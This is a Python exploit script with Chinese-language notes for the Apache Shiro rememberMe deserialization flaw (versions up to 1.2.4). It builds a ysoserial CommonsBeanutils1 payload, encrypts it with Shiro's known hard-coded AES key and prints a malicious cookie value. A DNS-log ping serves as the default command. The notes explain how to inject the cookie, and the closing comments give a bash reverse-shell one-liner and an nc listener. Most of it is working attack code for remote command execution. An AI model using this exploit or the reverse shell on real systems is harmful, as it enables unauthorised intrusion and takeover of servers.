# pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES
import binascii

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    # print(type(popen)) #<class 'subprocess.Popen'>
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA==" # 常量
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes # 随机值
    # print(iv)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())  
    # print(type(file_body)) # <class 'bytes'>
    # print(file_body)
    x = binascii.hexlify(file_body)
    java_hex = str(x,'ascii')
    #print("java_hex:\n",java_hex,"\n")
    # java_str = str(file_body, encoding = "latin-1")

    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    # print(base64_ciphertext)
    print("base64_ciphertext的type:",type(base64_ciphertext))
    base64_ciphertext_str = (str(base64_ciphertext, encoding = "utf-8"))
    return base64_ciphertext

def printpayload(command):
    rememberMe = encode_rememberme(command)
    #print("payload is :\nrememberMe=%s"%rememberMe)# 直接输出输出有b''
    print("payload is :\nrememberMe=%s"%str(rememberMe, encoding = "utf-8"))# bytes to str,输出没有b''

if __name__ == '__main__':
    printpayload(command="ping f4qe0k.dnslog.cn")

'''
漏洞说明
Apache Shiro在Java的权限及安全验证框架中占有重要的一席之地，在它编号为005的issue中爆出严重的Java反序列化漏洞。
Shiro在使用中存在一个名为rememberMe的Cookie，该Cookie中的值是base64编码形式，由数据通过AES（IV、CBC）加密生成，该值在传到服务端后，会对该值进行反序列换操作。
AES加密的IV可以是随机的，密钥采用固定密钥：kPH+bIxk5D2deZiIxcaaaA==

漏洞检测

首先找到存在问题的Shiro框架应用，如果条件允许，则通过服务器后台，搜索shiro的jar包，查看版本，版本 <= 1.2.4 均会存在问题
在通过前台拦截访问请求，检查是否存在rememberMe cookie, 在本次业务中，发现响应有返回设置rememberMe，但是设置过期了，在请求中无法发现该cookie。

复现过程：
1、访问http://dnslog.cn/
2、点击页面上的Get SubDomain就会给你分配一个随机的域名
3、点击页面上的Refresh Record就会刷新查询记录
4、在目标机器上运行"ping 你的随机域名"，这个网站点击Refresh Record就能看到记录
利用的办法就是使用截包工具来修改数据包在cookie里面加一个“rememberMe=XXXXX”，注意别忘了各个cookie之间的";"
'''
#反弹shell命令： bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
#nc监听shell： nc -l -p 8888 -vvv